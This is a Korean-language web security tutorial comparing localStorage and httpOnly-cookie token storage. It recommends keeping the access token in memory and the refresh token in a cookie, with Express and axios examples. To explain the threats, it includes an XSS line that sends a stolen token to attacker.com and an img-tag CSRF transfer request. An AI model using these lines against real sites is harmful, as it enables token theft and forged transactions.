# Token 저장 전략 — `localStorage` vs `httpOnly Cookie` 보안 비교

---

## 핵심 질문부터

> "Access Token을 어디에 저장해야 하는가?"

이 질문이 중요한 이유는, **저장 위치가 곧 공격 표면(attack surface)을 결정**하기 때문입니다. 선택지는 크게 두 가지입니다.

---

## 1. localStorage

### 동작 원리

브라우저가 제공하는 key-value 저장소. JavaScript로 자유롭게 읽고 쓸 수 있습니다.

```js
// 저장
localStorage.setItem("access_token", token);

// 읽기
const token = localStorage.getItem("access_token");

// API 요청 시
axios.get("/api/me", {
  headers: { Authorization: `Bearer ${token}` },
});
```

### 왜 편한가

구현이 단순합니다. 페이지를 새로고침해도 토큰이 남아있고, 탭 간 공유도 됩니다.

### 치명적 약점 — XSS

**XSS(Cross-Site Scripting)** 공격이 성공하는 순간, `localStorage`는 완전히 뚫립니다.

```js
// 공격자가 삽입한 스크립트가 실행되면
const stolen = localStorage.getItem("access_token");
fetch("https://attacker.com/steal?token=" + stolen);
// → 토큰 탈취 완료
```

XSS는 생각보다 쉽게 발생합니다. 사용자 입력을 `dangerouslySetInnerHTML`로 렌더링하거나, CDN으로 불러온 서드파티 스크립트가 오염되거나, npm 패키지 공급망 공격으로도 실행될 수 있습니다. **"우리 사이트에 XSS가 없다"는 전제는 보안 설계의 근거가 될 수 없습니다.**

---

## 2. `httpOnly Cookie`

### 동작 원리

서버가 `Set-Cookie` 헤더로 쿠키를 발급할 때 `HttpOnly` 플래그를 붙이면, **JavaScript에서 해당 쿠키에 접근하는 것이 원천 차단**됩니다.

```
Set-Cookie: refresh_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/auth
```

브라우저는 이후 같은 도메인으로 요청을 보낼 때 쿠키를 자동으로 첨부합니다. JS 코드는 이 쿠키의 존재조차 알 수 없습니다.

```js
// XSS 공격자가 이걸 시도해도
document.cookie; // → httpOnly 쿠키는 여기 안 보임
// 탈취 불가
```

### XSS에 강한 이유

공격자의 스크립트가 실행돼도 쿠키 값을 읽을 방법이 없습니다. 브라우저가 OS 수준에서 격리하기 때문입니다.

### 새로운 약점 — CSRF

쿠키는 JS가 읽지 못하는 대신, **브라우저가 자동으로 첨부**한다는 특성 때문에 CSRF 공격에 노출됩니다.

```
// 공격자 사이트에 심어놓은 코드
<img src="https://yourbank.com/transfer?to=attacker&amount=1000000" />
// → 사용자의 쿠키가 자동 첨부되어 요청 실행
```

하지만 이건 **`SameSite` 속성과 CSRF 토큰으로 방어 가능**합니다 (이건 다음 단계에서 별도로 다룹니다).

---

## 3. 두 방식 비교 요약

| 항목                  | `localStorage`     | `httpOnly Cookie`    |
| --------------------- | ------------------ | -------------------- |
| XSS 공격 시 토큰 탈취 | 가능 (치명적)      | 불가                 |
| CSRF 공격 노출        | 없음               | 있음 (단, 방어 가능) |
| JS 접근               | 가능               | 불가                 |
| 자동 첨부             | 수동 (헤더에 직접) | 브라우저가 자동      |
| 구현 복잡도           | 낮음               | 중간                 |
| 보안 수준             | 낮음               | 높음                 |

---

## 4. 실무 권장 패턴 — "둘 다 쓰되, 역할을 분리한다"

Access Token과 Refresh Token의 성격이 다르기 때문에 저장 전략도 다르게 가져갑니다.

```
Access Token  → 메모리(JS 변수)에 저장
Refresh Token → httpOnly Cookie에 저장
```

### 왜 이 구조인가

**Access Token을 메모리에 저장하면:**

- XSS가 발생해도 페이지 새로고침 시 사라집니다 (탈취해도 수명이 짧음)
- AT는 애초에 만료 시간이 짧으므로 (5~15분) 메모리 휘발성이 오히려 보안 장치가 됩니다

**Refresh Token을 httpOnly Cookie에 저장하면:**

- JS에서 접근 불가 → XSS로 탈취 불가
- 수명이 길기 때문에 (7일~30일) 탈취되면 치명적 → httpOnly 격리가 핵심

```
[브라우저]
  메모리 변수: access_token = "eyJ..."   ← JS가 읽어서 Authorization 헤더로 사용
  httpOnly Cookie: refresh_token = "..."  ← JS 접근 불가, 서버만 읽음

[요청 흐름]
  1. AT로 API 요청
  2. AT 만료(401) → /auth/refresh 요청 (RT는 쿠키로 자동 첨부)
  3. 서버가 RT 검증 → 새 AT 발급
  4. 새 AT를 응답 바디로 받아 메모리 업데이트
```

### 프론트엔드 구현 예시

```ts
// authStore.ts — AT는 모듈 스코프 변수로 관리 (Redux/Zustand 아님)
let accessToken: string | null = null;

export const setAccessToken = (token: string) => {
  accessToken = token;
};
export const getAccessToken = () => accessToken;
export const clearAccessToken = () => {
  accessToken = null;
};
```

```ts
// axios 인터셉터
axiosInstance.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

axiosInstance.interceptors.response.use(
  (res) => res,
  async (error) => {
    if (error.response?.status === 401) {
      // RT는 쿠키로 자동 첨부 → 별도 처리 불필요
      const { data } = await axios.post(
        "/auth/refresh",
        {},
        { withCredentials: true },
      );
      setAccessToken(data.accessToken);
      return axiosInstance(error.config); // 원래 요청 재시도
    }
    return Promise.reject(error);
  },
);
```

### 백엔드 구현 예시 (Express)

```ts
// 로그인 응답
res.cookie("refresh_token", refreshToken, {
  httpOnly: true, // JS 접근 차단
  secure: true, // HTTPS에서만 전송
  sameSite: "strict", // CSRF 방어
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7일
  path: "/auth", // /auth 경로에서만 첨부
});

res.json({ accessToken }); // AT는 바디로 전달
```

---

## 5. React SPA의 구조적 한계

위 패턴을 써도 SPA에는 근본적인 약점이 남습니다.

**페이지 새로고침 시 AT가 사라집니다.** 사용자가 F5를 누를 때마다 `/auth/refresh`를 자동 호출해서 AT를 복구해야 합니다. 이 타이밍을 처리하지 않으면 순간적으로 인증이 끊겨 깜빡이는 UI가 생깁니다.

더 근본적으로는, **어떤 XSS가 발생하면 AT는 메모리에서 실시간으로 훔쳐갈 수 있습니다.** 탈취 가능 시간이 짧을 뿐이지, 완벽히 막히는 건 아닙니다.

이 한계 때문에 **Next.js + BFF 패턴**이 등장합니다. BFF 서버가 AT까지 서버 메모리에서 관리하면 브라우저에 토큰 자체가 노출되지 않습니다. 이 내용은 2단계 아키텍처 설계에서 다룰 예정입니다.

---

## 이번 단계 핵심 정리

localStorage는 XSS에 무방비이므로 AT/RT 모두를 여기에 저장하는 건 보안 설계 실패입니다. httpOnly Cookie는 XSS를 막지만 CSRF에 노출되고, 이는 SameSite + CSRF 토큰으로 방어합니다. 실무 권장 패턴은 **AT는 메모리, RT는 httpOnly Cookie**로 역할을 분리하는 것이며, 이것이 3단계 `feat/jwt-basic` 구현의 기반 구조가 됩니다.
